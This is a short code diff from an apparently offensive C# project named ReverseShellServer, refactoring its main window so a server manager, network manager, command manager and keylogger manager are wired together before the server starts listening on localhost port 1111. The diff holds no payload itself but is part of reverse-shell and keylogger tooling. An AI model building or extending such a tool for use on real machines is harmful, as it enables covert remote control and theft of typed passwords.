@@ -19,13 +19,17 @@ namespace ReverseShellServer
         public MainWindow()
         {
             InitializeComponent();
+            
+            var manager = new ServerManager();
+
+            manager.networkManager = new ServerNetworkManager();
+            manager.commandsManager = new CommandsManager(manager.networkManager);
 
             // Give the KeyloggerManager instance to the KeyLogger ICommand
             keyLoggerManager = new KeyLoggerManager();
-            CommandsManager.PassKeyloggerManagerInstance(keyLoggerManager);
-            
-            // Start the server manager in a new thread as a task
-            var manager = new ServerManager();
+            manager.commandsManager.PassKeyloggerManagerInstance(keyLoggerManager);
+
+            // Start the processing in a new thread as a task
             var mainTask = new Task(() => manager.Start("127.0.0.1", 1111, 3000));
             mainTask.Start();
         }
